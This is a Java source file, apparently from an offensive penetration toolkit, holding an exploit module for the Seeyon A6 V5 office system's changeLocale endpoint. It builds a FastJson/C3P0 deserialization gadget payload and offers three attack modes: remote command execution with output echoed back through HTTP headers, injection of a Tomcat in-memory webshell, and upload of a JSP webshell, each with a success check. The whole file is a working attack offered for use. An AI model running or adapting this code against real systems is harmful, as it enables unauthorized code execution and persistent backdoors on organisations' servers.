package com.droplab.Controller.Seeyon.Service;

import com.droplab.Controller.FastJson.Service.FastJsonC3P0Other;
import com.droplab.Controller.Seeyon.Common.ROMEObject;
import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.Echo.TomcatEcho;
import com.droplab.Utils.Factory.CodeFactory;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.Utils.Memory.MemroyFactory;
import com.droplab.Utils.ResponseUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.io.File;
import java.nio.file.Files;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;

public class A6V5FastJson extends BugService {
    private final String contentPath="/main.do?method=changeLocale";
    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String url = null;
                String cmd = null;
                String mOption = null;
                String filepath = null;
                String filename = null;
                String mType = null;
                String mMiddle = null;
                String path = null;
                String mshellType = null;
                String password = null;
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("url")) {
                        url = params.get(key);
                    }else if (key.equals("cmd")) {
                        cmd = params.get(key);
                    }else if (key.equals("filepath")) {
                        filepath = params.get(key);
                    } else if (key.equals("filename")) {
                        filename = params.get(key);
                    } else if (key.equals("mType")) {
                        mType = params.get(key);
                    }else if (key.equals("mMiddle")) {
                        mMiddle = params.get(key);
                    }else if (key.equals("path")) {
                        path = params.get(key);
                    }else if (key.equals("mshellType")) {
                        mshellType = params.get(key);
                    }else if (key.equals("password")) {
                        password = params.get(key);
                    }else if (key.equals("mOption")) {
                        mOption = params.get(key);
                    }
                }
                if (!mOption.equals("")) {
                    String code = null;
                    String memory=null;
                    switch (mOption) {
                        case "Execute": //回显命令执行
                            if(mType.equals("Tomcat")){
                                code = TomcatEcho.instance().getTomcatEchoExecString("template");
                            }else {

                            }
                            break;
                        case "MemoryShell":
                            code = TomcatEcho.instance().getTomcatEchoDefineClass("","template");
                            memory = MemroyFactory.instance().getMemoryShell(mType, mMiddle, password, mshellType, path);
                            break;
                        case "UploadShell":
                        default:
                            if (new File(filepath).exists()) {
                                code = CodeFactory.instance().getUploadShell("template","com.alibaba.fastjson.JSON", filename, new File(filepath));
                            }
                            break;
                    }
                    if (code != null) {
                        byte[] decode = Base64.getDecoder().decode(code);
                        byte[] object = ROMEObject.instance().getObject(decode);
                        File file = new File(System.getProperty("java.io.tmpdir") + "//" + CommonUtils.Random() + ".tmp");
                        Files.write(file.toPath(),object);
                        FastJsonC3P0Other o =(FastJsonC3P0Other) Class.forName("com.droplab.Controller.FastJson.Service.FastJsonC3P0Other").newInstance();
                        HashMap hashMap = new HashMap();
                        hashMap.put("filepath",file.getAbsolutePath());
                        o.setParams(hashMap);
                        Connection.Response exploit = o.exploit();
                        String payload = new String(exploit.bodyAsBytes());
                        file.delete();
                        HashMap paramMap = new HashMap();
                        paramMap.put("_json_params",payload);
                        HashMap<String, String> headers = new HashMap<>();
                        CommonUtils.hashMapClone(InfoUtils.headers, headers);
                        headers.put("Referer", url);

                        ResponseUtils responseUtils = new ResponseUtils();
                        switch (mOption){
                            case "Execute": //回显命令执行
                                headers.put("Testcmd",cmd);
                                headers.put("Testecho","Testecho");
                                Connection.Response post = HttpUtils.post(headers, url + contentPath, paramMap);
                                if(post.hasHeader("TestCmd") && post.hasHeader("TestEcho")){
                                    String[] testcmd = post.header("TestCmd").split(",");
                                    byte[] decode1 = Base64.getDecoder().decode(testcmd[0]);
                                    responseUtils.setMessage(new String(decode1));
                                }
                                break;
                            case "MemoryShell":
                                paramMap.put("dy",memory);
                                Connection.Response post1 = HttpUtils.post(headers, url + contentPath, paramMap);
                                if(post1.hasHeader("Testecho")){
                                    responseUtils.setMessage("获取Testecho，注入成功！！！");
                                }
                                break;
                            case "UploadShell":
                            default:
                                Connection.Response post2 = HttpUtils.post(headers, url + contentPath, paramMap);
                                Thread.sleep(3*1000);
                                Connection.Response response = HttpUtils.get(url +"/"+ filename + ".jsp", headers);
                                if (new String(response.bodyAsBytes()).contains("this is testing <||>")){
                                    responseUtils.setMessage("上传文件成功");
                                }
                                break;
                        }
                        return responseUtils;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
